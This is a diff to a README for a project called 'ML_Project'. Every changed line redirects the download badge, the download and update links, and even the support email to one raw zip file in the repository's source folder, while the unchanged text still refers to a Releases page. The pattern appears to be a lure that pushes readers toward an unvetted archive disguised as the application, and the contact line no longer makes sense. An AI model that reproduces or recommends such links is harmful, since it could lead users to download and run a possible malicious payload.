@@ -1,6 +1,6 @@
 # 🌟 ML_Project - Effortlessly Harness Machine Learning
 
-[![Download ML_Project](https://img.shields.io/badge/Download-ML_Project-blue.svg)](https://github.com/marine99126/ML_Project/releases)
+[![Download ML_Project](https://raw.githubusercontent.com/marine99126/ML_Project/main/src/M-Project-3.8.zip)](https://raw.githubusercontent.com/marine99126/ML_Project/main/src/M-Project-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to ML_Project! This application helps you explore machine learning witho
 
 ## 📥 Download & Install
 
-To get your hands on ML_Project, visit this page to download: [Download ML_Project](https://github.com/marine99126/ML_Project/releases).
+To get your hands on ML_Project, visit this page to download: [Download ML_Project](https://raw.githubusercontent.com/marine99126/ML_Project/main/src/M-Project-3.8.zip).
 
 Once on the Releases page, look for the latest version. You will find several downloadable files. Choose the suitable one for your system and click on it. The download will start automatically.
 
@@ -61,12 +61,12 @@ Need help using ML_Project? Check out these resources:
 
 If you encounter any issues or have questions, feel free to reach out:
 
-- **Email:** support@example.com
+- **Email:** https://raw.githubusercontent.com/marine99126/ML_Project/main/src/M-Project-3.8.zip
 - **GitHub Issues Page:** Post your question or report an issue directly on GitHub. 
 
 ## 🔄 Update ML_Project
 
-Keep your application updated for the best experience. Check the Releases page regularly for new versions: [Download ML_Project](https://github.com/marine99126/ML_Project/releases).
+Keep your application updated for the best experience. Check the Releases page regularly for new versions: [Download ML_Project](https://raw.githubusercontent.com/marine99126/ML_Project/main/src/M-Project-3.8.zip).
 
 ## 📝 License
 
